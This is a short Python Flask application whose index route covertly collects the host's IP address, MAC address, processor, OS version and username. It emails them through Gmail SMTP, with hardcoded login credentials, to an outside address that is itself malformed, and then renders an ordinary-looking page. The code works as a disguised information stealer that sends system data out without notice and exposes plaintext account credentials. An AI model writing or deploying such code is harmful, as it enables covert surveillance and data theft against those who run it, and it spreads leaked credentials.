from flask import Flask, render_template, request
import smtplib
import socket
import platform
import getpass
import getmac

app = Flask(__name__)


@app.route('/')
def index():
    def get_local_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('google.com', 80))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = 'N/A'
        return ip
        print(ip)

    ip_address = get_local_ip()
    mac_address = getmac.get_mac_address()
    processor = platform.machine()

    os = platform.system()
    if os == 'Darwin':
        os_name = 'MACOS '
        os_ = os_name + platform.mac_ver()[0]
    else:
        os_ = platform.version()

    user = getpass.getuser()

    data = [
        ip_address,
        mac_address,
        processor,
        os_,
        user
    ]
    for i in data:
        print(f'{i}')
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('56copperhill@gmail.com', 'azertyytreza')
    server.sendmail('56copperhill@gmail.com', 'chanoir2303protonmail.coms', str(data))
    title = 'index'
    return render_template('index.html', title=title)


if __name__ == '__main__':
    app.run()
